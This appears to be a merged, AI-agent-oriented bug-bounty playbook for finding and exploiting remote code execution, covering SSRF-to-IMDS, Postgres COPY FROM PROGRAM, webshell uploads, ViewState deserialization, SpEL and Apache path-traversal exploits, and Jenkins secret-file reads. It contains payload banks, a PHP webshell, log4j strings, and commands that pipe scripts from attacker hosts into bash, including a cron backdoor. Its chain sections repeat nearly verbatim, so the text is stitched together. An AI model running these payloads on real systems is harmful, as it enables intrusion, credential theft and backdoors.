RCE in 2020-2026 rarely arrives at a single sink. Every modern RCE is composed of (1) a primitive that puts attacker bytes onto the host or into a deserialization pipeline, plus (2) an exec gadget that interprets them. The chains below decompose six high-paying RCE shapes into their primitive components — each step is testable in isolation, the chain is what pays.

### Chain 1 — SSRF + IMDSv1 + Leaked IAM Role → Lambda Invoke → Backend RCE (Capital One pattern)

- **A.** SSRF on a server-side fetcher (link-preview, image proxy, webhook URL, PDF generator). Confirmed via Burp Collaborator OOB callback.
- **B.** Point SSRF at AWS IMDSv1 metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → returns temporary STS credentials.
- **C.** Use the credentials with `aws lambda invoke --function-name <internal-function>` — Lambda runs server-side code that the attacker can influence via the function's input parameter.
- **Impact:** Full backend RCE in the Lambda context, plus pivot path to whatever else the role grants (S3 / DynamoDB / RDS).
- **Real shape:** Capital One 2019 — $80M civil penalty, attacker conviction. SSRF in a WAF on EC2 → IMDSv1 → IAM role → 106M-record breach via S3 sync. Cross-refs `ssrf` Disclosed Report Citation #6.

### Chain 2 — SQLi + `COPY FROM PROGRAM` → Direct OS-level RCE on Postgres Host

- **A.** SQLi confirmed on a Postgres backend (boolean/time-based works; UNION not needed).
- **B.** The DB user has either `pg_read_server_files` or `COPY` privileges (default for many AWS RDS / Google Cloud SQL roles when "admin" databases exist).
- **C.** Stack a query: `'; COPY users FROM PROGRAM 'curl http://attacker/x.sh | bash'; --` → Postgres shells out to `/bin/sh -c <attacker command>` → RCE as `postgres` user.
- **Impact:** RCE as the database user, which on managed Postgres frequently has IAM credentials and direct access to other AWS resources.
- **Real shape:** Multiple H1 disclosures 2020-2024 across SaaS apps backed by Postgres. Cross-refs `sqli` Disclosed Report Citation #12 and root cause discussion of `FILE`/`xp_cmdshell` privileges.

### Chain 3 — Image Upload + Path Traversal in Filename + Misconfigured MIME Serving → Webshell

- **A.** File upload accepts images (`image/png`, `image/jpeg`). The server saves with the user-supplied filename or only validates Content-Type, not actual content.
- **B.** Upload a `.aspx`/`.jsp`/`.php` file with the correct image magic-bytes (`GIF89a` + PHP after) and a filename containing `../` to write outside the upload directory into the web-root (`../../../public/webshell.php`).
- **C.** Request `https://target/webshell.php?cmd=id` — server's PHP/ASP.NET handler runs the script regardless of extension policy because the path doesn't pass through the upload-dir filter.
- **Impact:** Unauthenticated or low-priv attacker gets webshell on the application server with the web-server's process privileges.
- **Real shape:** Multiple disclosed H1 cases on legacy upload handlers; canonical pre-2020 RCE class. Pairs with `file-upload` (upload bypass table) and `misc` path-traversal patterns.

### Chain 4 — Prototype Pollution + Lodash/Mongoose Gadget Chain → `child_process.spawn` → Node RCE

- **A.** Identify prototype pollution sink — JSON merge / Object.assign / lodash `_.merge` / Node `Object.create` chain receiving attacker JSON.
- **B.** Pollute `Object.prototype.shell` to `true` OR `Object.prototype.env.NODE_OPTIONS` to `--require ./malicious.js`. The polluted prototype reaches a downstream `child_process.spawn` or `vm.runInThisContext`.
- **C.** Sink executes with attacker-controlled shell/env → attacker code runs in Node.js process context with full access to environment variables, AWS metadata, internal services.
- **Impact:** Server-side JS execution from a JSON POST. Common in Express apps using `body-parser` + `lodash.merge` for config-merging.
- **Real shape:** `lodash.merge` CVE-2018-16487, CVE-2019-10744, CVE-2020-8203; `mongoose` CVE-2024-53900 (cross-refs `sqli` Disclosed Report Citation #10 — same gadget family reaches Mongo `$where` instead of process).

### Chain 5 — Unencrypted ViewState + Recovered MachineKey → ASP.NET Deserialization → RCE (ToolShell class)

- **A.** Identify an ASP.NET endpoint where `__VIEWSTATEENCRYPTED=""` (ViewState is signed but not encrypted). Confirm via Burp / curl on form-bearing pages.
- **B.** Recover the `<machineKey>` validationKey — via config leak (`/web.config` accessible), via subdomain takeover of a sibling app sharing the key, or via the CVE-2025-53771 ToolShell exploit chain that exfils the key on Subscription Edition.
- **C.** Forge a ViewState using `ysoserial.net --plugin=ViewState --validationkey=<key>` with a `TypeConfuseDelegate` / `WindowsIdentity` payload. Submit to the endpoint. ASP.NET deserialises into a method-call gadget chain ending in `Process.Start` → RCE as the worker-process identity.
- **Impact:** Full RCE on the IIS web front-end with whatever the AppPool identity grants — often `NETWORK SERVICE` (with SharePoint farm-account access) or higher.
- **Real shape:** CVE-2025-53770 / 53771 ToolShell (July 2025 emergency advisory); SP2013 unpatched-by-EoL exposure. Cross-refs `sharepoint` ToolShell precondition chain and `aspnet` ViewState dual-parser anti-pattern.

### Chain 6 — XXE + PHP `expect://` Stream Wrapper → Direct RCE on Legacy PHP

- **A.** XXE confirmed via OOB DTD callback (`<!ENTITY % x SYSTEM "http://attacker/dtd">`).
- **B.** Target runs PHP with the `expect` extension enabled (rare in 2026, but still present on legacy hosts and some shared-hosting providers).
- **C.** Send `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>` — PHP's stream wrapper executes `id` through expect → output returned in entity expansion or via OOB.
- **Impact:** RCE as the PHP/web-server user without needing a separate upload or SQLi primitive.
- **Real shape:** Rockstar Games emblem editor XXE H1 #347139 (2018, $1,500); Adobe Commerce CosmicSting CVE-2024-34102 (XXE → RCE via crypt-key exfil). Cross-refs `xxe` Disclosed Report Citation #7 and #10.

### Related Skills & Chains

- **`ssti`** — Template engines that hit `eval()`/`exec()`/`os.system()` are RCE hiding behind a render call. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` reflected in email-template preview → unauthenticated RCE as the worker process.
- **`file-upload`** — File-write primitives become RCE when the upload directory is web-served, processed by a deserializer, or loaded by a `.htaccess`/`web.config`. Chain primitive: SVG/PHP polyglot bypasses MIME check → direct `GET /uploads/shell.php?cmd=id` → RCE; or DOCX with `phar://` stream wrapper → PHP object deserialization → RCE.
- **`ssrf`** — When the RCE primitive lives on an internal-only endpoint (admin console, internal Redis, Jenkins script-console), gate it through an SSRF. Chain primitive: external SSRF → `http://127.0.0.1:8080/manage/scriptText` (Jenkins/Tomcat) → Groovy `Runtime.exec` → RCE; or SSRF → `gopher://redis:6379` write to crontab → RCE.
- **`aspnet`** — ASP.NET ViewState deserialization is a giant RCE class behind a known `__VIEWSTATE` parameter. Chain primitive: machineKey recovery (or leaked `<machineKey>` from `web.config` disclosure) → `ysoserial.net -p ViewState -g TypeConfuseDelegate` → RCE as `IIS APPPOOL\<name>`.
- **`security-arsenal`** — Reach for the deserialization payload tree (ysoserial Java gadget chains, ysoserial.net for .NET ViewState/BinaryFormatter, Python pickle `__reduce__`, Ruby Marshal, PHP `phar://` metadata, Node `node-serialize` IIFE) the moment you have a sink that accepts serialized bytes.
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical. A "blind RCE" that turns out to be file-write-only with no execution path is not RCE; a sandboxed eval that can't reach `os` is at best Medium SSTI. Prove `whoami`/OOB DNS callback with a unique marker before writing the report.

### Chain 1 — SSRF + IMDSv1 + Leaked IAM Role → Lambda Invoke → Backend RCE (Capital One pattern)

- **A.** SSRF on a server-side fetcher (link-preview, image proxy, webhook URL, PDF generator). Confirmed via Burp Collaborator OOB callback.
- **B.** Point SSRF at AWS IMDSv1 metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → returns temporary STS credentials.
- **C.** Use the credentials with `aws lambda invoke --function-name <internal-function>` — Lambda runs server-side code that the attacker can influence via the function's input parameter.
- **Impact:** Full backend RCE in the Lambda context, plus pivot path to whatever else the role grants (S3 / DynamoDB / RDS).
- **Real shape:** Capital One 2019 — $80M civil penalty, attacker conviction. SSRF in a WAF on EC2 → IMDSv1 → IAM role → 106M-record breach via S3 sync. Cross-refs `hunt-ssrf` Disclosed Report Citation #6.

### Chain 2 — SQLi + `COPY FROM PROGRAM` → Direct OS-level RCE on Postgres Host

- **A.** SQLi confirmed on a Postgres backend (boolean/time-based works; UNION not needed).
- **B.** The DB user has either `pg_read_server_files` or `COPY` privileges (default for many AWS RDS / Google Cloud SQL roles when "admin" databases exist).
- **C.** Stack a query: `'; COPY users FROM PROGRAM 'curl http://attacker/x.sh | bash'; --` → Postgres shells out to `/bin/sh -c <attacker command>` → RCE as `postgres` user.
- **Impact:** RCE as the database user, which on managed Postgres frequently has IAM credentials and direct access to other AWS resources.
- **Real shape:** Multiple H1 disclosures 2020-2024 across SaaS apps backed by Postgres. Cross-refs `hunt-sqli` Disclosed Report Citation #12 and root cause discussion of `FILE`/`xp_cmdshell` privileges.

### Chain 3 — Image Upload + Path Traversal in Filename + Misconfigured MIME Serving → Webshell

- **A.** File upload accepts images (`image/png`, `image/jpeg`). The server saves with the user-supplied filename or only validates Content-Type, not actual content.
- **B.** Upload a `.aspx`/`.jsp`/`.php` file with the correct image magic-bytes (`GIF89a` + PHP after) and a filename containing `../` to write outside the upload directory into the web-root (`../../../public/webshell.php`).
- **C.** Request `https://target/webshell.php?cmd=id` — server's PHP/ASP.NET handler runs the script regardless of extension policy because the path doesn't pass through the upload-dir filter.
- **Impact:** Unauthenticated or low-priv attacker gets webshell on the application server with the web-server's process privileges.
- **Real shape:** Multiple disclosed H1 cases on legacy upload handlers; canonical pre-2020 RCE class. Pairs with `hunt-file-upload` (upload bypass table) and `hunt-misc` path-traversal patterns.

### Chain 4 — Prototype Pollution + Lodash/Mongoose Gadget Chain → `child_process.spawn` → Node RCE

- **A.** Identify prototype pollution sink — JSON merge / Object.assign / lodash `_.merge` / Node `Object.create` chain receiving attacker JSON.
- **B.** Pollute `Object.prototype.shell` to `true` OR `Object.prototype.env.NODE_OPTIONS` to `--require ./malicious.js`. The polluted prototype reaches a downstream `child_process.spawn` or `vm.runInThisContext`.
- **C.** Sink executes with attacker-controlled shell/env → attacker code runs in Node.js process context with full access to environment variables, AWS metadata, internal services.
- **Impact:** Server-side JS execution from a JSON POST. Common in Express apps using `body-parser` + `lodash.merge` for config-merging.
- **Real shape:** `lodash.merge` CVE-2018-16487, CVE-2019-10744, CVE-2020-8203; `mongoose` CVE-2024-53900 (cross-refs `hunt-sqli` Disclosed Report Citation #10 — same gadget family reaches Mongo `$where` instead of process).

### Chain 5 — Unencrypted ViewState + Recovered MachineKey → ASP.NET Deserialization → RCE (ToolShell class)

- **A.** Identify an ASP.NET endpoint where `__VIEWSTATEENCRYPTED=""` (ViewState is signed but not encrypted). Confirm via Burp / curl on form-bearing pages.
- **B.** Recover the `<machineKey>` validationKey — via config leak (`/web.config` accessible), via subdomain takeover of a sibling app sharing the key, or via the CVE-2025-53771 ToolShell exploit chain that exfils the key on Subscription Edition.
- **C.** Forge a ViewState using `ysoserial.net --plugin=ViewState --validationkey=<key>` with a `TypeConfuseDelegate` / `WindowsIdentity` payload. Submit to the endpoint. ASP.NET deserialises into a method-call gadget chain ending in `Process.Start` → RCE as the worker-process identity.
- **Impact:** Full RCE on the IIS web front-end with whatever the AppPool identity grants — often `NETWORK SERVICE` (with SharePoint farm-account access) or higher.
- **Real shape:** CVE-2025-53770 / 53771 ToolShell (July 2025 emergency advisory); SP2013 unpatched-by-EoL exposure. Cross-refs `hunt-sharepoint` ToolShell precondition chain and `hunt-aspnet` ViewState dual-parser anti-pattern.

### Chain 6 — XXE + PHP `expect://` Stream Wrapper → Direct RCE on Legacy PHP

- **A.** XXE confirmed via OOB DTD callback (`<!ENTITY % x SYSTEM "http://attacker/dtd">`).
- **B.** Target runs PHP with the `expect` extension enabled (rare in 2026, but still present on legacy hosts and some shared-hosting providers).
- **C.** Send `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>` — PHP's stream wrapper executes `id` through expect → output returned in entity expansion or via OOB.
- **Impact:** RCE as the PHP/web-server user without needing a separate upload or SQLi primitive.
- **Real shape:** Rockstar Games emblem editor XXE H1 #347139 (2018, $1,500); Adobe Commerce CosmicSting CVE-2024-34102 (XXE → RCE via crypt-key exfil). Cross-refs `hunt-xxe` Disclosed Report Citation #7 and #10.

### Related Skills & Chains

- **`hunt-ssti`** — Template engines that hit `eval()`/`exec()`/`os.system()` are RCE hiding behind a render call. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` reflected in email-template preview → unauthenticated RCE as the worker process.
- **`hunt-file-upload`** — File-write primitives become RCE when the upload directory is web-served, processed by a deserializer, or loaded by a `.htaccess`/`web.config`. Chain primitive: SVG/PHP polyglot bypasses MIME check → direct `GET /uploads/shell.php?cmd=id` → RCE; or DOCX with `phar://` stream wrapper → PHP object deserialization → RCE.
- **`hunt-ssrf`** — When the RCE primitive lives on an internal-only endpoint (admin console, internal Redis, Jenkins script-console), gate it through an SSRF. Chain primitive: external SSRF → `http://127.0.0.1:8080/manage/scriptText` (Jenkins/Tomcat) → Groovy `Runtime.exec` → RCE; or SSRF → `gopher://redis:6379` write to crontab → RCE.
- **`hunt-aspnet`** — ASP.NET ViewState deserialization is a giant RCE class behind a known `__VIEWSTATE` parameter. Chain primitive: machineKey recovery (or leaked `<machineKey>` from `web.config` disclosure) → `ysoserial.net -p ViewState -g TypeConfuseDelegate` → RCE as `IIS APPPOOL\<name>`.
- **`security-arsenal`** — Reach for the deserialization payload tree (ysoserial Java gadget chains, ysoserial.net for .NET ViewState/BinaryFormatter, Python pickle `__reduce__`, Ruby Marshal, PHP `phar://` metadata, Node `node-serialize` IIFE) the moment you have a sink that accepts serialized bytes.
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical. A "blind RCE" that turns out to be file-write-only with no execution path is not RCE; a sandboxed eval that can't reach `os` is at best Medium SSTI. Prove `whoami`/OOB DNS callback with a unique marker before writing the report.

## Tools and wordlists

### Tools

`interactsh` · `commix` · `ysoserial` · `nuclei` · `Burp`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_rce.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_rce.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_rce.txt` | 53 |
| `~/.local/share/hackerone-reports/wordlists/payloads_rce_waf.txt` | 12 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_rce.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_rce.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_rce.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Use OAST for blind command injection; check argument injection in tools that shell out.

```sh
nuclei -u https://target -tags rce,cmdi,oast \
       -severity low,medium,high,critical -rl 40 -o nuclei_rce.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/cmdi -dast \
       -rl 40 -o nuclei_rce_cmdi.txt
nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/header-command-injection.yaml \
       -rl 40 -o nuclei_rce_header-command-injection.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Grep Patterns for Source Review

```bash
# Command injection sinks
grep -rn "exec\|system\|popen\|spawn\|eval\|subprocess" --include="*.rb" .
grep -rn "Runtime.exec\|ProcessBuilder\|ScriptEngine" --include="*.java" .

# Template engine instantiation
grep -rn "Mustache\|Handlebars\|nunjucks\|render_template\|Template\(" .

# Unsafe YAML load
grep -rn "yaml\.load\b\|YAML\.load\b" . # without Loader= argument
grep -rn "Yaml()\|new Yaml()" --include="*.java" .
```

---

## Real-world examples

### Real Impact Examples

**Scenario A: Management Console Role → Root Shell (Enterprise Server)**
An attacker with a low-privileged "Management Console Editor" account on a GitHub Enterprise Server instance identified that the syslog-ng configuration UI accepted a free-form "destination" field. By injecting a `program()` destination containing a reverse shell command, the attacker caused the syslog-ng daemon (running as root) to execute arbitrary OS commands upon log receipt. The same attack surface was independently found in collectd's exec plugin configuration and nomad's job template rendering — all reachable from the same editor role. Impact: full root compromise of the enterprise git server hosting all organization source code, secrets, and CI/CD pipelines.

**Scenario B: Dependency Confusion → RCE on Build Infrastructure**
A researcher enumerated internal npm package names by reviewing JavaScript bundles served from target CDN endpoints and public GitHub repositories belonging to a major payments platform. Several `@internal/*` scoped packages were referenced but not registered on the public npm registry. The researcher published higher-versioned packages with identical names containing a postinstall script that executed a canary callback. Within hours, the callback fired from multiple IP addresses belonging to the target's CI/CD build farm — confirming that every npm install on their build infrastructure executed attacker-controlled code. The same technique worked against a ride-sharing platform's internal tooling. Impact: arbitrary code execution on build servers with access to production deployment credentials and signing keys.

**Scenario C: Exposed Kubernetes API → Cluster Takeover**
During reconnaissance on a target's cloud infrastructure, a researcher discovered a publicly accessible Kubernetes API server (port 6443) with overly permissive RBAC. Using default service account tokens and unauthenticated API calls, the researcher enumerated running pods, retrieved secrets from the default namespace (including database credentials and third-party API keys), and demonstrated the ability to spawn privileged pods with `hostPID: true` — enabling full node compromise. The Kubernetes cluster managed the target's core production services. Impact: access to all stored secrets, ability to deploy malicious workloads, and pivot to every service in the cluster.

---

## Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class rce --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class rce
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class rce
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class rce --min-bounty 1000
```

### Related

- `hackerone-deserialization` (93 reports)
- `hackerone-ssti` (28 reports)
- `hackerone-file-upload` (100 reports)

### Related

- `deserialization` (93 reports)
- `ssti` (28 reports)
- `file-upload` (100 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/os-command-injection (separators, time delays, output redirection, useful post-exploitation commands)
2. https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/command-injection/asynchronous (asynchronous injection + Collaborator OAST procedure)
3. https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration (`nslookup \`whoami\`.collab` exfiltration payload)
4. https://hacktricks.wiki/en/pentesting-web/command-injection.html (payload matrix, option injection, second-order/PEM/ExifTool cases, top-25 params)
5. https://github.com/PortSwigger/command-injection-attacker (SHELLING methodology and feedback channels)
6. https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection (dangerous APIs by language, bypasses)
7. https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html (escapeshellarg, parameterization, `--` end-of-options caveat)
8. https://top10.owasp.org/2025/A05_2025-Injection (A05:2025 Injection scope and CWE mapping)
9. https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html (native deserialization → RCE, .NET gadget list, safe alternatives)
10. https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/nextjs.html (React2Shell Flight payload, RSC scanner oracle, version coverage)
11. https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation (quote-free Jinja2/Mako/Twig RCE payloads)
12. https://www.usenix.org/system/files/usenixsecurity23-zhao-yudi.pdf (template sandbox escape research)

## Additional notes

### Shell metacharacters

```text
;id
|id
||id
&id
&&id
$(id)
`id`
%0aid
%0d%0aid
';id;'
";id;"
|whoami
;cat /etc/passwd
$(cat /etc/passwd)
`cat /etc/passwd`
```

### Argument injection

```text
--output=/tmp/x
-o /tmp/x
--config=/tmp/x
--upload-pack=id
--checkpoint-action=exec=id
-fsSL http://callback/x
--proxy=http://callback:8080
--dump-config
@file
file:///etc/passwd
```

### Expression / template / log4j

```text
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
${jndi:ldap://callback/a}
${jndi:dns://callback/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://callback/a}
{{cycler.__init__.__globals__.os.popen('id').read()}}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<%= system('id') %>
```

### Upload / parser / archive

```text
push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://callback/x)'\npop graphic-context
<?php system($_GET['c']); ?>
<svg onload=alert(1)>
../../../../var/www/html/shell.php
..\..\..\..\inetpub\wwwroot\shell.aspx
PK../../../../var/www/html/shell.php
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_rce.txt` (53)
- `~/.local/share/hackerone-reports/wordlists/payloads_rce_waf.txt` (12 filter/WAF-focused)

### Parameters observed

`for[]` · `id` · `name` · `for` · `iclLayout` · `url` · `debug` · `action` · `email` · `status` · `new_size[]` · `scope` · `dag_id` · `username` · `password` · `search` · `ref` · `client_id` · `redirect_uri` · `response_type`

### Potential pre-auth RCE on Twitter VPN

`#591295` · X / xAI · $20,160 · critical · 2019-08-10 · ▲1246
> Hi, we(Orange Tsai and Meh Chang) are the security research team from DEVCORE. Recently, we are doing a research about SSL VPN security, and found several critical vulnerabilities on Pulse Secure SSL VPN! We have reported to vendor and patches have been released on 2019/4/25.

### Exposed Kubernetes API - RCE/Exposed Creds

`#455645` · Snapchat · $25,000 · critical · 2021-07-29 · ▲1191
> @txt3rob found one of Snaps internal Kubernetes instances exposing an API endpoint without authorization to the public. With access to this API he was able to run arbitrary code/jobs as a cluster-admin and gained access to credentials with internal access to a significant number of instances. During a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint without authorization to the public.

### RCE via npm misconfig -- installing internal libraries from the public registry

`#925585` · PayPal · $30,000 · critical · 2021-02-09 · ▲946
> A Bug Bounty researcher identified an issue where certain development projects defaulted to the public NPM registry, instead of using the intended internal packages. Since the packages on the public registry did not exist, the researcher created these and observed they were downloaded. Had these packages been registered with malicious intent, it is possible for internal development to have included this code.

### DoS on PayPal via web cache poisoning

`#622122` · PayPal · $9,700 · medium · 2019-10-23 · ▲851
> On https://paypal.com/, you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from www.paypalobjects.com with the message '501 Not Implemented'. This was patched and awarded a $9,700 bounty. By the time you read this, there should be a full writeup on this technique at https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning

### H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products

`#422944` · Shopify · $0 · medium · 2020-02-06 · ▲830
> kitcrm.com allows the administrator to upload priority product images located at: https://kitcrm.com/seller/onboarding/1 {F359446} {F359447} These images are not being checked if they are real JPG/PNG/GIF. When uploading an ImageTragick (issue found my Tavis Ormandy) using the following payload (my netcat listener is on ██████████:8080: Then connecting kitcrm to Facebook Messenger, and writing the following commands to kit: {F359445} {F359443} {F359444} A…

### URL Patterns

```
/management-console/*
/admin/settings/*
/api/v*/exec
/api/v*/run
/webhook/*
/_internal/*
/import?url=
/render?template=
/preview?format=
```

### Template Injection Probes

```
# Generic polyglot — works across Jinja2, Twig, Freemarker, Pebble, Velocity
{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}
{{'7'*7}}
{{config}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}

# Nomad template injection (Go text/template)
{{ env "NOMAD_SECRET_ID" }}
{{ with secret "secret/data/prod" }}{{ .Data.password }}{{ end }}
{{ runscript "id" }}
```

### Apache HTTP Server alias path traversal (CVE-2021-41773 / CVE-2021-42013)

Path normalization bug in Apache 2.4.49 (and the 2.4.50 patch-bypass) lets an attacker escape DocumentRoot via dot-encoded segments **through configured alias paths**. The same primitive yields very different impact depending on which alias accepts the traversal:

- Alias without `Options +ExecCGI` (e.g. `/icons/`) → arbitrary file read only
- Alias with `Options +ExecCGI` (e.g. `/cgi-bin/`) → arbitrary code execution

**Version fingerprint:**
```bash
curl -sI http://target/ | grep -i "Server:"
# Vulnerable: Apache/2.4.49 (CVE-2021-41773) or Apache/2.4.50 (CVE-2021-42013)
# Patched:    Apache/2.4.51+
```

**File-read test (any alias):**
```bash
curl --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
# Note: --path-as-is is REQUIRED — curl normalizes %2e by default
```

**RCE test (cgi-enabled alias only):**
```bash
curl --path-as-is -X POST \
  -d "echo Content-Type: text/plain; echo; id; uname -a; hostname" \
  "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

**Triage discipline note:** when the same path-traversal primitive works on multiple aliases but only one is CGI-enabled, the **maximum** impact is the severity — not the average. A "file read" finding on `/icons/` should always be escalated by re-probing `/cgi-bin/` (and any other alias visible from `<Directory>` blocks in the server-info disclosure or response patterns). See `triage-validation` Pre-Severity Gate.

### Spring Cloud Function SpEL injection (CVE-2022-22963)

Spring Cloud Function ≤ 3.2.2 (and ≤ 3.1.6) evaluates the `spring.cloud.function.routing-expression` header as a SpEL expression on the `/functionRouter` endpoint without auth, before any routing logic. Wide deployment in AWS Lambda + Cloud Run + on-prem function platforms. Often exposed externally because `/functionRouter` auto-registers and devs don't add an explicit gate.

**Detection:**
- Spring-style port 8080 with `/uppercase`, `/lowercase`, or arbitrary single-word function endpoints responding 200
- Confirm with `curl -s http://target:8080/uppercase -H "Content-Type: text/plain" --data-binary "test"` → returns `TEST`
- Version banner via `/actuator/info` or response headers

**Exploit:**
```bash
curl -X POST http://target:8080/functionRouter \
  -H "Content-Type: text/plain" \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})' \
  --data "x"
```

The `new String[]{"...", "..."}` array form avoids shell-quoting issues that break the more common `.exec("id")` form when the SpEL header contains parentheses or quotes.

**Generalizes to:** any Spring application that takes user input into a `SpelExpressionParser.parseExpression()` call, especially when delivered via header / query-param routes that bypass normal auth filters. See `hunt-ssti` for the broader SpEL fingerprinting (`*{7*7}` = Spring Thymeleaf).

### SnakeYAML RCE Gadget

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/exploit.jar"]
  ]]
]
```

### Ruby YAML / rdoc_options RCE

```yaml
--- !ruby/object:Gem::Installer
i: x
```

### Dependency Confusion Detection

```bash
# Find internal package names
grep -r '"name"' node_modules/ | grep '@internal\|@company\|@private'
# Check if public registry has higher version
npm view @target-company/internal-package version 2>/dev/null
```

### Ingress-nginx Path Injection

```
# In spec.rules.http.paths.path
/something)(;.*);#
# Results in nginx config injection
```

### Kubernetes Exposed API Check

```bash
curl -sk https://TARGET:6443/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
kubectl --insecure-skip-tls-verify -s https://TARGET:6443 get pods --all-namespaces
```

### ActiveStorage Path Traversal → RCE

```
# Filename in upload request
filename="../../../../etc/cron.d/backdoor"
# Cron payload content
* * * * * root curl http://attacker.com/shell | bash
```

### Args4j `@`-prefix file expansion (Jenkins CVE-2024-23897 family)

Java CLIs built on the `args4j` library default to `expandAtFiles=true`, which expands `@filename` arguments by reading the file and treating each line as a separate command argument. When such a CLI is exposed over HTTP (Jenkins CLI is the canonical case), the server-side error message echoes failed arguments back — turning argument echoing into an arbitrary file-read primitive. Unauthenticated when "anonymous read access" is on (Jenkins default for fresh installs).

**Detection:**
- Target exposes `/cli` and `/jnlpJars/jenkins-cli.jar` (Jenkins family)
- Or: any Java app whose CLI source uses args4j without `expandAtFiles=false`

**Test (Jenkins):**
```bash
# Get the legit CLI jar from the target
curl -sLO http://target:8080/jnlpJars/jenkins-cli.jar

# First line of file leaks via 'help' error
java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/etc/passwd
# → ERROR: Too many arguments: root:x:0:0:root:/root:/bin/bash

# Full file leaks via 'connect-node' (every line returned as a "no such agent" error)
java -jar jenkins-cli.jar -s http://target:8080/ -http connect-node @/etc/passwd
# → All passwd lines echoed back

# Recon: env vars + JENKINS_HOME path
java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/proc/self/environ
```

**Crown-jewel files after JENKINS_HOME confirmed:**
- `/var/jenkins_home/secret.key` — master encryption key for stored credentials
- `/var/jenkins_home/secrets/master.key` — derives the encryption key
- `/var/jenkins_home/credentials.xml` — credential store (encrypted with secret.key — pair with offline decrypt tools)
- `/var/jenkins_home/users/*/config.xml` — per-user API tokens (often unencrypted)
- `/var/jenkins_home/jobs/*/config.xml` — pipeline configs that may inline AWS keys, SSH keys, registry tokens

**Pattern generalizes beyond Jenkins.** Any Java service that:
1. Embeds args4j (most enterprise Java CLIs since 2010s)
2. Exposes the CLI handler over HTTP (Jenkins, Hudson forks, custom internal tools)
3. Returns argument-parsing errors verbatim to the client

→ same arbitrary-read primitive applies. Validation via `triage-validation` Reproducibility Gate: confirm the leak on at least 2 distinct commands (e.g., `help` and `connect-node`) and verify the file content actually appears in the response, not just a generic 500.

## Companion methodology (merged, deduplicated)

Full text of every non-SKILL.md methodology file from the contributing skills — payload banks, technique references, reconnaissance and attack-class guides.

### Companion: hunting / references/payloads.md

# RCE — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Shell -> `;id`, `|id`, `$(id)`, backticks, `%0aid`, newline injection

- Argument -> `--output=/tmp/x`, `-o`, `--config`, `file://`

- Expression -> `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`

- Log4j -> `${jndi:ldap://callback/a}`

- ImageMagick -> `push graphic-context` / `fill 'url(https://callback/x)'`



## Payload bank



**53 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Shell metacharacters



```text

;id

|id

||id

&id

&&id

$(id)

`id`
